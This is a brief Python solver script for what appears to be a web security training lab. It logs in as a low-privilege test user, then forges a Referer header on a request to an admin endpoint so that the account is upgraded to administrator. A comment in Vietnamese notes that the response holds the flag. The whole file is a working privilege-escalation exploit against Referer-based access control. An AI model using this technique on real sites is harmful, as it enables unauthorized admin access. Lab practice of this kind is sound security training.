#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0ad200e003f133c9837cce8900e60071.web-security-academy.net'

data = {
    'username': 'wiener',
    'password': 'peter'
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['set-cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

headers = {
    'Referer': url + '/admin',
}

params = {
    'username': 'wiener',
    'action': 'upgrade',
}

response = requests.get(
    url + '/admin-roles',
    params=params,
    cookies=cookies,
    headers=headers,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
